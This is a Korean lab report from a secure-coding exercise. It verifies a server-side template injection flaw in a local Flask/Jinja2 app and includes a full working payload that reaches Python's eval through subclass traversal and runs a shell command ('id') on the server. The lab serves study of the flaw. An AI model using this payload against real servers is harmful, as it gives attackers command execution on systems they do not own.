# SSTI (Server-Side Template Injection) 취약점 실습 보고서

---

## 1. 실습 개요

- **주제**: Flask 기반 웹 서버의 SSTI(Server-Side Template Injection) 취약점 검증
- **목표**: Jinja2 템플릿 엔진의 취약점을 이용하여 서버 측 명령어를 실행하는 PoC 검증

---

## 2. 환경 구성

- **OS**: Windows 10 (PowerShell 사용)
- **Docker**: Docker Desktop for Windows
- **Python**: 3.x 버전
- **Flask 버전**: 3.0.3

### 사용한 주요 파일

| 파일명 | 설명 |
|:---|:---|
| docker-compose.yml | Flask 서버를 컨테이너로 띄우기 위한 설정 파일 |
| Dockerfile | Flask 앱을 컨테이너화하기 위한 설정 파일 |
| src/app.py | SSTI 취약점이 존재하는 Flask 웹 어플리케이션 |
| poc.py | SSTI 취약점을 이용해 공격을 수행하는 PoC 스크립트 |

---

## 3. 동작 흐름

### 3.1 Docker Compose로 서버 실행

```bash
docker compose up --build
```

**실행 화면 캡처:**

![Image](https://github.com/user-attachments/assets/daadfddf-5e53-4cf1-bc6a-9b7e64732820)
![Image](https://github.com/user-attachments/assets/496fb46c-71ec-4a10-88bd-6904319996f9)

---

### 3.2 웹 브라우저에서 SSTI 테스트

- URL 접근:

```
http://localhost:8000/?name={{7*7}}
http://localhost:8000/?name={{8*7}}
```

- 결과 화면:

![Image](https://github.com/user-attachments/assets/402e2e64-3c8e-492a-9f26-3ea9e106e2c9)
![Image](https://github.com/user-attachments/assets/f381ca1f-7c97-4e79-adb5-78b96683e8bd)

---

### 3.3 PoC 코드 실행

- `poc.py` 실행:

```bash
python poc.py
```

- 출력 결과:

![Image](https://github.com/user-attachments/assets/502dcf05-434b-4329-92a5-18b85075f404)
![Image](https://github.com/user-attachments/assets/08c1953d-7c9a-48d7-af3e-021ab99a0e15)

---

### 3.4 서버의 명령어 실행 결과

- 서버에서 `id` 명령어 결과를 반환:

![Image](https://github.com/user-attachments/assets/76a3486c-77d2-4990-8f5f-13b8809ddf9c)

---

## 4. 취약점 검증 (PoC)

### 4.1 SSTI 공격 페이로드

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("id").read()') }}
        {% endif %}
      {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

- 해당 페이로드를 통해 서버 내부에서 명령어 실행(`id`)을 성공적으로 수행하였다.

---

## 5. 결과 요약

| 항목 | 결과 |
|:---|:---|
| SSTI 취약점 존재 여부 | o 존재 확인 |
| 명령어 실행 성공 여부 | o 서버 명령어(id) 실행 성공 |
| PoC 성공 여부 | o 성공적으로 서버 제어 |

---

## 6. GitHub 레포지터리

- 작업 결과 GitHub 레포지터리:  
[https://github.com/buddle031/secure-coding](https://github.com/buddle031/secure-coding)

---

## 7. 결론

본 실습을 통해 Flask/Jinja2 환경에서 발생 가능한 SSTI 취약점을 직접 검증하고, 서버 측 명령어 실행까지 성공하였다.  
이를 통해 서비스 개발 시 템플릿 렌더링 과정에서 입력값을 철저히 검증하고, 취약점을 예방하는 보안 조치가 필요함을 확인할 수 있었다.

--- 
